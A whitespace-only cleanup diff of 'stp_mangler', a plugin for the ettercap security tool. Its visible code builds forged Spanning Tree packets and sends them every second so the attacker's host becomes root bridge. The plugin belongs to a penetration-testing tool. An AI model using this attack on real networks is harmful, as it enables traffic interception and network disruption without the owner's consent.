@@ -1,8 +1,8 @@
 /*
-    stp_mangler -- ettercap plugin -- Become root of a switches spanning tree 
+    stp_mangler -- ettercap plugin -- Become root of a switches spanning tree
 
     Copyright (C) ALoR & NaGA
-    
+
     This program is free software; you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation; either version 2 of the License, or
@@ -36,7 +36,7 @@ struct eth_header
 };
 
 struct llc_header
-{ 
+{
     u_int8   dsap;
     u_int8   ssap;
     u_int8   cf;
@@ -46,7 +46,7 @@ struct llc_header
     u_int8   BPDU_flags;
 };
 
-struct stp_header 
+struct stp_header
 {
     u_int16  root_priority;
     u_int8   root_id[6];
@@ -74,49 +74,49 @@ EC_THREAD_FUNC(mangler);
 
 /* plugin operations */
 
-struct plugin_ops stp_mangler_ops = { 
+struct plugin_ops stp_mangler_ops = {
    /* ettercap version MUST be the global EC_VERSION */
-   .ettercap_version =  EC_VERSION,                        
+   .ettercap_version =  EC_VERSION,
    /* the name of the plugin */
-   .name =              "stp_mangler",  
-    /* a short description of the plugin (max 50 chars) */                    
-   .info =              "Become root of a switches spanning tree",  
-   /* the plugin version. */ 
-   .version =           "1.0",   
+   .name =              "stp_mangler",
+    /* a short description of the plugin (max 50 chars) */
+   .info =              "Become root of a switches spanning tree",
+   /* the plugin version. */
+   .version =           "1.0",
    /* activation function */
    .init =              &stp_mangler_init,
-   /* deactivation function */                     
+   /* deactivation function */
    .fini =              &stp_mangler_fini,
 };
 
 /**********************************************************/
 
 /* this function is called on plugin load */
-int plugin_load(void *handle) 
+int plugin_load(void *handle)
 {
    return plugin_register(handle, &stp_mangler_ops);
 }
 
 /******************* STANDARD FUNCTIONS *******************/
 
-static int stp_mangler_init(void *dummy) 
-{     
+static int stp_mangler_init(void *dummy)
+{
    /* It doesn't work if unoffensive */
    if (GBL_OPTIONS->unoffensive) {
       INSTANT_USER_MSG("stp_mangler: plugin doesn't work in UNOFFENSIVE mode\n");
       return PLUGIN_FINISHED;
    }
-      
+
    INSTANT_USER_MSG("stp_mangler: Start sending fake STP packets...\n");
 
    /* create the flooding thread */
    ec_thread_new("mangler", "STP mangler thread", &mangler, NULL);
-        
+
    return PLUGIN_RUNNING;
 }
 
 
-static int stp_mangler_fini(void *dummy) 
+static int stp_mangler_fini(void *dummy)
 {
    pthread_t pid;
 
@@ -139,11 +139,11 @@ EC_THREAD_FUNC(mangler)
    struct stp_header *hstp;
    u_char MultiMAC[6]={0x01,0x80,0xc2,0x00,0x00,0x00};
 
-   /* Avoid crappy compiler alignment :( */    
+   /* Avoid crappy compiler alignment :( */
    heth  = (struct eth_header *)fake_pck;
    hllc  = (struct llc_header *)(fake_pck + 14);
    hstp  = (struct stp_header *)(fake_pck + 22);
-   
+
    /* Create a fake STP packet */
    heth->proto = htons(0x0026);
    memcpy(heth->dha, MultiMAC, ETH_ADDR_LEN);
@@ -152,7 +152,7 @@ EC_THREAD_FUNC(mangler)
    hllc->dsap = 0x42;
    hllc->ssap = 0x42;
    hllc->cf   = 0x03;
-   
+
    hstp->root_priority = 0;
    memcpy(hstp->root_id, GBL_IFACE->mac, ETH_ADDR_LEN);
    hstp->bridge_priority = 0;
@@ -166,19 +166,19 @@ EC_THREAD_FUNC(mangler)
 
    /* init the thread and wait for start up */
    ec_thread_init();
-   
+
    LOOP {
       CANCELLATION_POINT();
 
       /* Send on the wire and wait */
-      send_to_L2(&fake_po); 
+      send_to_L2(&fake_po);
       sleep(1);
    }
-   
-   return NULL; 
+
+   return NULL;
 }
 
 /* EOF */
 
 // vim:ts=3:expandtab
- 
+
